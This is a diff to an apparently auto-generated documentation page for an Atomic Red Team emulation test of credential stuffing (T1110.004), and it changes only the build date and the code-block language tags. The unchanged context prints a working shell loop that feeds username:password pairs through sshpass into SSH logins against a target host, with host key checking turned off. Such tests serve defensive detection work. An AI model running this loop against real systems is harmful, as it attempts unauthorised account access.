@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1110.004"
 attack_technique_name: "Brute Force: Credential Stuffing"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "a790d50e-7ebf-48de-8daa-d9367e0911d4"
@@ -52,13 +52,13 @@ Requires SSHPASS
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 pkg install -y sshpass
 ```
 
@@ -69,7 +69,7 @@ pkg install -y sshpass
 
 ### Command
 
-```sh
+```bash
 cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
 for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 ```
